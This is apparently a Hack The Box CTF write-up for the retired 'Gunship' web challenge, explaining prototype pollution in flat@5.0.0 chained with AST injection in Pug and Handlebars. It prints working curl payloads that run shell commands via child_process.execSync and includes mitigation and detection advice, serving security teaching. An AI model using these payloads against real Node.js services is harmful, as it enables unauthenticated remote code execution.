---
challenge: Gunship
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, nodejs, express, prototype-pollution, ast-injection, pug, handlebars, rce]
---

# Gunship — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Challenge solved; no real flags.
> The original instance (HTB x Uni CTF 2020) used **Handlebars**; the copy served by the platform uses **Pug**. Same vector, different payload.

## TL;DR

Express handles `POST /api/submit`, runs the JSON through `unflatten()` from `flat@5.0.0` — vulnerable to **prototype pollution** — and compiles a **fixed** template with the engine at hand. Because the compiler reads AST node properties (`node.type`, `node.body`) through the prototype chain, polluting `Object.prototype` injects a fake node: **AST injection**. That node's value is concatenated unquoted into the generated code and executed: RCE in a single unauthenticated request.

## Brief and surface

- Web category, Easy, retired.
- Full source is provided (Express + `package.json` + Dockerfile) plus an instance at `IP:port`.
- The app is a fan page that "submits" an artist; the backend answers with a rendered greeting.

## Recon

```bash
curl -s -i http://<IP>:<PORT>/ | head -20
curl -s http://<IP>:<PORT>/package.json
```

`package.json` holds the two dependencies that matter:

```json
{ "dependencies": { "express": "^4.17.1", "flat": "5.0.0", "pug": "3.0.2" } }
```

`flat@5.0.0` is pinned, not ranged: it is the vulnerable version. The engine (`pug` or `handlebars`) decides the payload.

## Source analysis

```js
router.post('/api/submit', (req, res) => {
  const { artist } = unflatten(req.body);
  if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
    return res.json({
      response: pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
    });
  }
  return res.json({ response: 'please provide us with the name of an artist' });
});
```

Two details:

- `unflatten()` rebuilds the object from dotted keys. In `flat@5.0.0` it does not filter `__proto__`, so a `__proto__.x` key writes to `Object.prototype` instead of your object.
- The template is **constant**: there is no classic SSTI. Injection goes through the AST the compiler walks.

The `artist.name.includes(...)` check forces that field into the same body but blocks nothing: include one of the surnames.

## The bug

1. The engine's parser builds an AST and walks it with `accept(node)`.
2. `accept` calls the handler `this[node.type]`, passing it the node. If `node.type` is missing on the node, JavaScript looks up the prototype; with `Object.prototype.type = 'Program'` polluted, the compiler believes the node is a whole program.
3. In the code generator some values are emitted **unquoted** (they are numbers or positions). When the value comes from `Object.prototype`, it is an arbitrary string and lands as JavaScript code.
4. The engine compiles with `new Function(...)`: the string runs.

Execution is blind (the response carries no stdout), so write to a statically served directory.

## Local reproduction

```bash
docker build -t gunship .
docker run -p 1337:1337 gunship
```

The container listens on `1337` and serves `/static` from the app directory, which is the exfiltration channel.

## Exploitation

### Pug variant (current platform)

1. Confirm the pollution with a harmless text node:

```bash
curl -s http://<IP>:<PORT>/api/submit -H 'Content-Type: application/json' \
  -d '{"artist.name":"Haigh","__proto__.block":{"type":"Text","val":"POLLUTED"}}'
```

The response contains `POLLUTED`: the injected node rendered.

2. Swap `val` for `line`, which the generator emits unquoted, and execute:

```bash
curl -s http://<IP>:<PORT>/api/submit -H 'Content-Type: application/json' \
  -d '{"artist.name":"Haigh","__proto__.block":{"type":"Text","line":"process.mainModule.require(\"child_process\").execSync(\"cp /app/flag* /app/static/flag\")"}}'
```

3. Read the result:

```bash
curl -s http://<IP>:<PORT>/static/flag
```

### Handlebars variant (CTF 2020)

```bash
curl -s http://<IP>:<PORT>/api/submit -H 'Content-Type: application/json' -d '{
  "artist.name":"Gingell",
  "__proto__.type":"Program",
  "__proto__.body":[{"type":"MustacheStatement","path":0,
    "params":[{"type":"NumberLiteral","value":"process.mainModule.require(\"child_process\").execSync(\"cat flag* > /app/static/out\")"}],
    "loc":{"start":0,"end":0}}]
}'
curl -s http://<IP>:<PORT>/static/out
```

The container has **no `bash`**: use `sh` or simple commands. If the flag is not in `/app`, `ls /` from the payload finds it.

## Evidence

- Response with the injected node rendered and the trimmed contents of `/static/flag`.
- No real flags: values live in `private/`.

## Lessons learned

- `flat@5.0.0` is not "a utility library": it is the entry point; the pinned version in `package.json` is the first thing to read.
- Prototype pollution without a gadget is not RCE; with a template engine that reads the AST through prototypes, it is.
- `{"__proto__": ...}` in JSON does not always work; `"__proto__.key"` as a flat property does, because `unflatten` expands it.
- A Handlebars payload does not work against Pug: identify the engine before copying an exploit.
- Exfiltrating through `/static` avoids needing a reverse shell in a container without tools.

## Mitigations and detection

- Upgrade `flat` (≥5.0.1 filters `__proto__`) and freeze prototypes (`Object.freeze(Object.prototype)`) at startup.
- Never compile templates with data that can reach the AST; use variables (`{{ user }}`) and constant templates.
- Validate input JSON against a schema that rejects dotted keys and `__proto__`/`constructor`/`prototype`.
- Detection: requests with `__proto__` in the body, compiler 500s, and writes into static directories served by the app.

MITRE: T1190 (exploit public-facing application), T1059.007 (JavaScript), T1027 (obfuscated files or information).

## References

- <https://sec.stealthcopter.com/htb-ctf-write-up-gunship/>
- <https://po6ix.github.io/AST-Injection>
- <https://7rocky.github.io/en/ctf/htb-challenges/web/gunship>
- <https://github.com/advisories/GHSA-8h8p-x289-vvqr>
